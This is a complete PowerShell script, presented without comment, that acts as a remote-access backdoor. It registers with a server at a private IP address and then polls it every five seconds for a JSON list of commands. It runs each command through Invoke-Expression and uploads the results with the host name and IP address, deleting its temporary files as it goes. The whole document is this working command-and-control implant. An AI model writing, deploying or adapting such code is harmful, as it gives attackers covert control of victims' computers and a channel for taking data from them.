
$command_url = "http://192.168.16.132/commands/fuckme.json"
$upload_url = "http://192.168.16.132/uploads/fuckme_response.txt"
$notify_url = "http://192.168.16.132/uploads/notify.txt"
$local_command_file = "$Env:temp\fuckme.json"
$local_result_file = "$Env:temp\fuckme_response.txt"
$agentname = "fuckme"

function Notify-Server {
    try {
        "identifier=$agentname" | Out-File -FilePath $Env:TEMP\fuckme_notify.txt -Encoding utf8
        Start-BitsTransfer -Source $Env:TEMP\fuckme_notify.txt -Destination $notify_url -TransferType Upload -ErrorAction Stop
        Remove-Item $Env:TEMP\fuckme_notify.txt -Force
    } catch {
        Write-Error "Failed to notify server: $_"
    }
}

function Download-Command {
    try {
        Start-BitsTransfer -Source $command_url -Destination $local_command_file -ErrorAction Stop
    } catch {
        Write-Error "Failed to download command file: $_"
    }
}

function Execute-Commands {
    if (Test-Path $local_command_file) {
        $json = Get-Content $local_command_file | ConvertFrom-Json
        if ($json.commands -and $json.commands.Count -gt 0) {
            $allResults = @()
            foreach ($cmd in $json.commands) {
                try {
                    $result = Invoke-Expression $cmd 2>&1
                } catch {
                    $result = "Command '$cmd' failed: $_"
                }
                $entry = "$($env:COMPUTERNAME)`n$((Get-NetIPAddress -AddressFamily IPv4 | Where-Object { $_.InterfaceAlias -notlike '*Loopback*' } | Select-Object -First 1).IPAddress)`nCommand: $cmd`nResult:`n$result"
                $allResults += $entry
            }

            $allResults -join "`n`n" | Out-File -FilePath $local_result_file -Encoding utf8
            $json.commands = @()  # Clear all commands after execution
            $json | ConvertTo-Json -Depth 2 | Out-File -FilePath $local_command_file -Encoding utf8
        }
    }
}


function Upload-Result {
    if (Test-Path $local_result_file) {
        try {
            Start-BitsTransfer -Source $local_result_file -Destination $upload_url -TransferType Upload -ErrorAction Stop
            Remove-Item -Path $local_result_file -Force
        } catch {
            Write-Error "Failed to upload result: $_"
        }
    }
}

function Main {
    Notify-Server
    while ($true) {
        Download-Command
        Execute-Commands
        Upload-Result
        Remove-Item $local_command_file -ErrorAction SilentlyContinue
        Start-Sleep -Seconds 5
    }
}

Main
